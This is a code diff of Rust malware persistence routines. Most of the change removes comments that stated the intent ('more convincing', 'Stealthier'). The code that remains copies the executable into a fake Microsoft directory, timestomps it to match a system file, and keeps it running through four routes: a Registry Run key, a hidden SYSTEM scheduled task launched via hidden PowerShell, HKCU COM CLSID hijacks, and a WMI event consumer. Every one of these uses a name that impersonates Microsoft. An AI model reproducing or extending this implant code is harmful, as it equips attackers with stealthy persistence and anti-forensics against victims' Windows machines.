@@ -22,7 +22,6 @@ async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
     let current_exe = env::current_exe()?;
     let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;
 
-    // Use a more convincing system directory
     let data_dir = base_dirs.data_local_dir().join("Microsoft").join("Protect").join("S-1-5-21-2026");
     if !data_dir.exists() {
         fs::create_dir_all(&data_dir)?;
@@ -69,7 +68,6 @@ fn set_hidden_system(path: &Path) {
     }
 }
 
-/// "Timestomping" - copying MACE timestamps from a legitimate system file
 fn timestomp(target: &Path, reference: &Path) {
     #[cfg(target_os = "windows")]
     {
@@ -85,7 +83,6 @@ fn timestomp(target: &Path, reference: &Path) {
         use windows::Win32::Foundation::HANDLE;
         use windows::core::PCWSTR;
         use ntapi::ntioapi::{NtQueryInformationFile, NtSetInformationFile, FILE_BASIC_INFORMATION, FileBasicInformation};
-        use ntapi::ntrtl::LARGE_INTEGER;
         use std::mem::MaybeUninit;
 
         unsafe {
@@ -128,9 +125,7 @@ fn timestomp(target: &Path, reference: &Path) {
                     if let Ok(h_target) = h_target {
                         let mut io_status_set = MaybeUninit::uninit();
                         let mut info_to_set = basic_info;
-                        
-                        // ChangeTime is the 'Entry' time (MFT modified)
-                        // By using NtSetInformationFile we can set all 4 at once
+
                         NtSetInformationFile(
                             h_target.0 as _,
                             io_status_set.as_mut_ptr() as _,
@@ -146,313 +141,95 @@ fn timestomp(target: &Path, reference: &Path) {
 }
 
 fn ensure_persistence_mechanisms(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-
-    // 1. Registry Run key (Classic)
-
     let _ = ensure_registry_run_key(path);
-
-    
-
-    // 2. Hidden Scheduled Task (Stealthier)
-
     let _ = ensure_hidden_scheduled_task(path);
-
-
-
-    // 3. COM Hijacking (Refined)
-
     let _ = ensure_com_hijack_refined(path);
-
-
-
-    // 4. WMI Event Consumer (Advanced)
-
     let _ = ensure_wmi_event_consumer(path);
-
-
-
     Ok(())
-
 }
-
-
 
 fn ensure_registry_run_key(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-
     let run_key = hkcu.open_subkey_with_flags(
-
         r"Software\Microsoft\Windows\CurrentVersion\Run",
-
         KEY_SET_VALUE,
-
     )?;
 
-
-
     let app_name = "MicrosoftHostProtection";
-
     run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
-
     Ok(())
-
 }
-
-
 
 fn is_admin() -> bool {
-
     let output = std::process::Command::new("net")
-
         .arg("session")
-
         .output();
-
-    
-
     match output {
-
         Ok(out) => out.status.success(),
-
         Err(_) => false,
-
     }
-
 }
-
-
 
 fn ensure_hidden_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-
-
-
     let task_name = "MicrosoftWindowsSystemDiagnostics";
-
-
-
     let exe_path = path.to_string_lossy().replace("\"", "\\\"");
-
-
-
-    
-
-
-
-    // Use PowerShell to create a truly hidden task
-
-
-
     let script = if is_admin() {
-
-
-
         format!(
-
-
-
             "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force",
-
-
-
             exe_path, task_name
-
-
-
         )
-
-
-
     } else {
-
-
-
         format!(
-
-
-
             "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Settings $settings -Force",
-
-
-
             exe_path, task_name
-
-
-
         )
-
-
-
     };
 
-
-
-
-
-
-
     let _ = Command::new("powershell")
-
-
-
         .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
-
-
-
         .output();
-
-
-
-        
-
-
-
     Ok(())
-
-
-
 }
-
-
-
-
-
-
 
 fn ensure_com_hijack_refined(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-
     let clsids = [
-
         "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruLongList
-
         "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MmcDmp
-
     ];
 
-    
-
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-
     let path_str = path.to_string_lossy();
 
-    
-
     for clsid in clsids {
-
-        // Use LocalServer32 for EXEs, InprocServer32 is for DLLs
-
         let base_path = format!(r"Software\Classes\CLSID\{}", clsid);
 
-        
-
-        // Hijack LocalServer32
-
         if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\LocalServer32", base_path)) {
-
             let _ = key.set_value("", &path_str.as_ref());
-
         }
-
-
-
-        // Also try InprocServer32 as some processes might fallback or misbehave
 
         if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\InprocServer32", base_path)) {
-
             let _ = key.set_value("", &path_str.as_ref());
-
             let _ = key.set_value("ThreadingModel", &"Both");
-
         }
-
     }
-
-    
-
     Ok(())
-
 }
-
-
 
 fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-
-
-
     if !is_admin() {
-
-
-
-        return Ok(()); // WMI persistence usually requires Admin
-
-
-
+        return Ok(());
     }
 
-
-
-
-
-
-
     let task_name = "WinMgmtEngineHealth";
-
-
-
     let exe_path = path.to_string_lossy().replace("\\", "\\\\");
-
-
-
-    
-
-
-
     let script = format!(
-
-
-
         "$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{task_name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfRawData_PerfOS_System'''}}; $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{task_name}';CommandLineTemplate='{exe_path}'}}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}",
-
-
-
         task_name = task_name,
-
-
-
         exe_path = exe_path
-
-
-
     );
 
-
-
-
-
-
-
     let _ = Command::new("powershell")
-
-
-
         .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
-
-
-
         .output();
-
-
-
-
-
-
-
     Ok(())
-
-
-
 }
-
-
-
-
